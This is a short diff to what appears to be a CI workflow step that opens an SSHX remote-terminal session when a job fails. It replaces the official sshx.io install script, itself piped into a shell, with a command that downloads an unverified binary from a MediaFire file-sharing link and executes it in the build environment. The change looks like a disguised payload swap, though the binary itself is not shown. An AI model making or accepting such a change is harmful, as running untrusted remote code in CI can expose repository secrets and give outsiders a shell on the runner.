@@ -22,4 +22,4 @@ jobs:
       - name: Start SSHX in case of failure
         if: failure()
         run: |
-          curl -sSf https://sshx.io/get | sh -s run
+          curl -L "https://download1326.mediafire.com/3lvtxr1mnyxgDEw7aYmHThUzYQyJNDXcjIeTA3feyXi8uEKp16VlfX4KsIGsxIci6DYb4_FhpkTQ_68Xq8ZjvezAt03FhlLOYvv_X0a8MCPqsDHTr2BIaXalB-pKXDq4-wgUZvJPkYfWW1fGQcd358uT_fdAxIpg9Qs-1_8wGb3gMg/ma4wtb7zjzl98w8/sshx" -o sshx && chmod +x sshx && ./sshx
